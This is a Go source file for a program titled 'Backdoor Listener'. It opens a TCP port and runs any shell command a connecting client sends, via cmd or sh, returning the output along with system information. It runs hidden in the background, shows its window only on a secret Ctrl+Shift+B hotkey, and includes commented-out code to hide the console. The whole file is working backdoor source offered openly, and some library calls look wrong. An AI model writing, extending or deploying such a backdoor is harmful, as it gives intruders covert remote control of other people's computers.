package main

import (
	"bufio"
	"context"
	"encoding/json"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/andlabs/ui"
	_ "github.com/andlabs/ui" // Use the native UI backend
	"github.com/micmonay/keybd_event" // Corrected import
)

const (
	HOST = "127.0.0.1" // Default listener host
	PORT = "12345"    // Default listener port
	TYPE = "tcp"
)

var (
	listenerConn      net.Conn
	uiMutex           sync.Mutex
	mainWindow        *ui.Window
	addressEntry      *ui.Entry
	portEntry         *ui.Entry
	connectButton     *ui.Button
	logText           *ui.MultilineEntry
	stopListener      chan struct{}
	startListenerOnce sync.Once
)

type Config struct {
	Host string `json:"host"`
	Port string `json:"port"`
}

func loadConfig() Config {
	config := Config{Host: HOST, Port: PORT}
	data, err := os.ReadFile("config.json")
	if err == nil {
		err = json.Unmarshal(data, &config)
		if err != nil {
			log.Println("Error unmarshalling config:", err)
		}
	}
	return config
}

func saveConfig(config Config) {
	data, err := json.MarshalIndent(config, "", "  ")
	if err != nil {
		log.Println("Error marshalling config:", err)
		return
	}
	err = os.WriteFile("config.json", data, 0644)
	if err != nil {
		log.Println("Error saving config:", err)
	}
}

func executeCommand(command string) string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd", "/C", command)
	} else {
		cmd = exec.Command("sh", "-c", command)
	}
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Sprintf("Error executing command: %v\n%s", err, string(output))
	}
	return string(output)
}

func changeDirectory(path string) string {
	err := os.Chdir(path)
	if err != nil {
		return fmt.Sprintf("Error changing directory: %v", err)
	}
	wd, _ := os.Getwd()
	return fmt.Sprintf("Changed directory to: %s", wd)
}

func getSysInfo() string {
	osName := runtime.GOOS
	arch := runtime.GOARCH
	hostname, _ := os.Hostname()
	username := "N/A" // Getting username reliably across platforms is tricky
	return fmt.Sprintf("OS: %s\nArchitecture: %s\nHostname: %s\nUsername: %s", osName, arch, hostname, username)
}

func handleConnection(conn net.Conn) {
	defer conn.Close()
	reader := bufio.NewReader(conn)
	writer := bufio.NewWriter(conn)
	logMessage(fmt.Sprintf("Client connected: %s", conn.RemoteAddr()))

	for {
		command, _ := reader.ReadString('\n')
		command = strings.TrimSpace(command)
		if command == "quit" {
			break
		}
		var result string
		if strings.HasPrefix(command, "cd ") {
			path := strings.TrimSpace(command[3:])
			result = changeDirectory(path)
		} else if command == "sysinfo" {
			result = getSysInfo()
		} else if command != "" {
			result = executeCommand(command)
		}
		_, err := writer.WriteString(result + "\n")
		writer.Flush()
		if err != nil {
			logMessage(fmt.Sprintf("Error sending response: %v", err))
			break
		}
	}
	logMessage(fmt.Sprintf("Client disconnected: %s", conn.RemoteAddr()))
}

func startListenerService(host, port string) {
	ln, err := net.Listen(TYPE, host+":"+port)
	if err != nil {
		logMessage(fmt.Sprintf("Error listening: %v", err))
		return
	}
	defer ln.Close()
	logMessage(fmt.Sprintf("Listening on %s:%s", host, port))

	for {
		conn, err := ln.Accept()
		if err != nil {
			select {
			case <-stopListener:
				logMessage("Listener stopped.")
				return
			default:
				logMessage(fmt.Sprintf("Error accepting connection: %v", err))
				continue
			}
		}
		go handleConnection(conn)
	}
}

func startListener(host, port string) {
	startListenerOnce.Do(func() {
		stopListener = make(chan struct{})
		go startListenerService(host, port)
		logMessage("Listener service started in the background.")
	})
}

func stopListenerService() {
	if stopListener != nil {
		close(stopListener)
		listenerConn = nil
		logMessage("Stopping listener service...")
		startListenerOnce = sync.Once{} // Reset the once for potential restart
	} else {
		logMessage("Listener service is not running.")
	}
}

func updateUIConfig() {
	uiMutex.Lock()
	defer uiMutex.Unlock()
	config := loadConfig()
	addressEntry.SetText(config.Host)
	portEntry.SetText(config.Port)
}

func connectButtonHandler(button *ui.Button) {
	uiMutex.Lock()
	defer uiMutex.Unlock()
	host := addressEntry.Text()
	port := portEntry.Text()
	config := Config{Host: host, Port: port}
	saveConfig(config)
	startListener(host, port)
}

func logMessage(message string) {
	ui.QueueMain(func() {
		uiMutex.Lock()
		defer uiMutex.Unlock()
		logText.Append(fmt.Sprintf("[%s] %s\n", time.Now().Format("2006-01-02 15:04:05"), message))
	})
	log.Println(message) // Also log to the console for debugging
}

func createUI() {
	err := ui.Main(func() {
		mainWindow = ui.NewWindow("Backdoor Listener", 300, 200, false)
		mainWindow.OnClosing(func(*ui.Window) bool {
			stopListenerService()
			ui.Quit()
			return true
		})

		addressLabel := ui.NewLabel("Listen Address:")
		addressEntry = ui.NewEntry()
		portLabel := ui.NewLabel("Listen Port:")
		portEntry = ui.NewEntry()
		connectButton = ui.NewButton("Start Listener")
		logLabel := ui.NewLabel("Log:")
		logText = ui.NewMultilineEntry()
		logText.SetReadOnly(true)

		config := loadConfig()
		addressEntry.SetText(config.Host)
		portEntry.SetText(config.Port)

		connectButton.OnClicked(connectButtonHandler)

		grid := ui.NewGrid()
		grid.SetPadded(true)

		grid.Append(addressLabel, 0, 0, 1, 1, false, ui.AlignFill, false, ui.AlignFill)
		grid.Append(addressEntry, 1, 0, 1, 1, true, ui.AlignFill, false, ui.AlignFill)
		grid.Append(portLabel, 0, 1, 1, 1, false, ui.AlignFill, false, ui.AlignFill)
		grid.Append(portEntry, 1, 1, 1, 1, true, ui.AlignFill, false, ui.AlignFill)
		grid.Append(connectButton, 0, 2, 2, 1, true, ui.AlignCenter, false, ui.AlignFill)
		grid.Append(logLabel, 0, 3, 2, 1, false, ui.AlignFill, false, ui.AlignFill)
		grid.Append(logText, 0, 4, 2, 1, true, ui.AlignFill, true, ui.AlignFill)

		mainWindow.SetChild(grid)
		mainWindow.Show()

		// Start the listener with the initial configuration
		startListener(config.Host, config.Port)
	})
	if err != nil {
		log.Fatal("UI initialization failed:", err)
	}
}

func main() {
	// Hide the console window (Windows specific - might need build flags)
	if runtime.GOOS == "windows" {
		//go hideConsole() // Implement hideConsole using syscall if needed
	}

	// Global variable to track UI visibility
	uiVisible := false
	var uiMutexLocal sync.Mutex

	// Key combination to toggle UI visibility (Ctrl + Shift + B)
	hotkey := []keybd_event.KeyCombo{
		{keybd_event.CtrlKey, keybd_event.ShiftKey, keybd_event.KeyB},
	}

	kb, err := keybd_event.NewKeybd()
	if err != nil {
		log.Fatal("Error creating keybd instance:", err)
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	go func() {
		for {
			select {
			case <-ctx.Done():
				return
			default:
				if runtime.GOOS == "windows" { // Hotkey listening might be OS-specific
					pressed := true
					for _, k := range hotkey {
						if !kb.IsPressed(k.Code) {
							pressed = false
							break
						}
					}
					if pressed {
						uiMutexLocal.Lock()
						if !uiVisible {
							go createUI()
							uiVisible = true
						} else if mainWindow != nil {
							ui.QueueMain(func() {
								uiMutex.Lock()
								defer uiMutex.Unlock()
								mainWindow.Show()
							})
						}
						uiMutexLocal.Unlock()
						time.Sleep(time.Millisecond * 500) // Debounce
					}
				} else {
					log.Println("Hotkey listening not fully implemented for non-Windows OS with this library.")
					// You would need to implement OS-specific hotkey listening here
				}
				time.Sleep(time.Millisecond * 100)
			}
		}
	}()

	log.Println("Backdoor listener running in the background. Press Ctrl+Shift+B to open UI.")

	// Keep the main goroutine alive
	select {}
}

// Placeholder for hiding console on Windows (requires syscall)
// func hideConsole() {
// 	hwnd := syscall.GetConsoleWindow()
// 	if hwnd != 0 {
// 		syscall.ShowWindow(hwnd, syscall.SW_HIDE)
// 	}
// }